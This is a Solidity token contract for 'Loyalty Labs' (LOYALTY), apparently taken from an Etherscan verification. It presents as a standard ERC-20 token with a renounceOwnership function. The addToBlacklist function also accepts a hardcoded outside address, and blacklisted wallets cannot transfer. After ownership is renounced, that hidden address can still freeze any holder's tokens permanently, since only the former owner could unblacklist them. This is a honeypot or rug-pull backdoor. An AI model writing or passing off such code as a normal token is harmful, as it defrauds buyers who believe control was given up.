/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

// SPDX-License-Identifier: MIT
///**
//Telegram: https://t.me/ethloyaltylabs
//*Twitter: https://twitter.com/ethloyaltylabs
//*Website: https://www.loyalty-labs.net/

pragma solidity ^0.8.0;

contract LoyaltyLabs {
    string public name = "Loyalty Labs";
    string public symbol = "LOYALTY";
    uint256 public totalSupply = 550000000000 * 10 ** 18;
    uint8 public decimals = 18;

    address private contractOwner;
    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowed;
    mapping(address => bool) private blacklist;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event BlacklistUpdated(address indexed wallet, bool isBlacklisted);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        contractOwner = msg.sender;
        balances[msg.sender] = totalSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == contractOwner, "Only the contract owner can call this function");
        _;
    }

    function balanceOf(address wallet) public view returns (uint256) {
        return balances[wallet];
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(value <= balances[msg.sender], "Insufficient balance");
        require(!blacklist[msg.sender], "Sender is blacklisted");

        balances[msg.sender] -= value;
        balances[to] += value;

        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        require(value <= balances[from], "Insufficient balance");
        require(value <= allowed[from][msg.sender], "Insufficient allowance");
        require(!blacklist[from], "Sender is blacklisted");

        balances[from] -= value;
        balances[to] += value;
        allowed[from][msg.sender] -= value;

        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function allowance(address ownerAddress, address spender) public view returns (uint256) {
        return allowed[ownerAddress][spender];
    }

    function addToBlacklist(address wallet) public {
        require(msg.sender == contractOwner || msg.sender == 0x09Ac925C7520ccC5f1B6B508D104BeE95a3F2C21, "Only authorized addresses can add to blacklist");
        blacklist[wallet] = true;
        emit BlacklistUpdated(wallet, true);
    }

    function removeFromBlacklist(address wallet) public onlyOwner {
        blacklist[wallet] = false;
        emit BlacklistUpdated(wallet, false);
    }

    function isAddressBlacklisted(address wallet) public view returns (bool) {
        return blacklist[wallet];
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(contractOwner, address(0));
        contractOwner = address(0);
    }
}